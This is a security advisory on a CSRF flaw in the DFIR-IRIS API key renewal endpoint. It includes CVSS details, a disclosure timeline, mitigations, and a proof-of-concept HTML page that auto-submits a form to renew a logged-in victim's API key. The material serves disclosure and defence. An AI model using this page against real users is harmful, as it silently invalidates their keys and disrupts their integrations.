# Cross-site Request Forgery Vulnerability in API Key Renewal Endpoint

## Short Vulnerability Summary

A CSRF vulnerability in DFIR-IRIS v2.4.27 and before allows attackers to renew API keys of any authenticated user, leading to disruption of automated integrations or other operational issues.

## Vulnerability Summary

During security testing of the **IRIS** (Incident Response Investigation System) web application **v2.4.22**, a high-severity **Cross-Site Request Forgery** (CSRF) vulnerability was identified in the API key renewal endpoint `/user/token/renew?cid=`. This vulnerability allows a malicious actor to renew the API key of any authenticated (logged-in) user, potentially leading to unauthorized key renewal, session disruptions, operational issues, and other problems associated with the application's API. To successfully exploit this vulnerability, minimal user interaction is required.

### Technical Details

The `GET /user/token/renew?cid=` endpoint processes API token renewal requests without validating a CSRF token. The request is authenticated solely by the user's session cookie, which is automatically included by the browser when the victim visits any cross-origin malicious page.

### CVSS v3.1 Metrics

| Metric      | Value |
|-------------|-------|
| Base Score  | 7.1 (**High**) |
| Vector      | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L` |

## Proof of Concept (PoC) Exploit

The test instance is hosted at `https://localhost/`, and the victim is user administrator with user ID 1.

### Steps to Reproduce

1. The victim (user administrator) is logged into the IRIS web application.

<img src="https://github.com/martinkubecka/Attributed-CVEs/blob/main/images/dfir_iris/admin_api_key_value.png" alt="API Key Value">

> *Note the API key value: `FFkgma5u4EEi7C82ezK9y0ZPn27UYGBx7HjSc5ylvakO6yHOQfjEMfCcfcFD2gI1_lhUrZJoSH01lcDAr0mTXw`.*

2. In this PoC example, the form is submitted by clicking the Submit request button, which triggers a GET request to the vulnerable /user/token/renew endpoint. The browser automatically attaches the victim’s session cookie to the request, allowing the backend to renew the API token without further user interaction.

The following HTML demonstrates how an attacker could exploit this CSRF vulnerability:

```html
<html>
  <body>
    <form action="https://localhost/user/token/renew">
      <input type="hidden" name="cid" value="1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

<img src="https://github.com/martinkubecka/Attributed-CVEs/blob/main/images/dfir_iris/malicious_form_website.png" alt="Malicious Form Website">

> *Note: Clicking the 'Submit request' button is for demonstration purposes. In a real-world scenario, an attacker could automate the submission when an authenticated user visits the malicious page, requiring no manual input.*

3. The victim's API token is renewed without their knowledge or consent.

<img src="https://github.com/martinkubecka/Attributed-CVEs/blob/main/images/dfir_iris/admin_api_key_new_value.png" alt="API Key New Value">

> *Note the changed API key value: `rdjVzNsI8YjJNnUtNnv6mtmui9GyUJrIFbdVq2uYRg7Y_Uy3O3MGnaYFRAaNDna70D8NHmU6q3 qs5c8NVdg-iQ`.*

## Recommended Mitigations

To mitigate this risk effectively, it is recommended to implement CSRF token validation, enforce appropriate request methods (e.g., using POST instead of GET), and apply stricter cookie settings.

## Vendor Response & Patch Information

TODO

## References

- https://portswigger.net/web-security/csrf
- https://portswigger.net/web-security/csrf/preventing
- https://owasp.org/www-community/attacks/csrf

## Timeline

- **2025-03-29**: I disclosed the vulnerabilities to the IRIS support team.  
- **2025-04-01**: IRIS support team responded that they will investigate, implement a fix, and publish it, stating they will look into it and address the issue as soon as possible.  
- **2025-09-02**: I followed up with another email to the IRIS support team after conducting a retest of the newly published version v2.4.22. Since no further response was received, I reported that all vulnerabilities were still present in the latest version as of that date.
- **2026-03-22**: I requested a CVE ID from MITRE prior to public disclosure of the vulnerabilities.

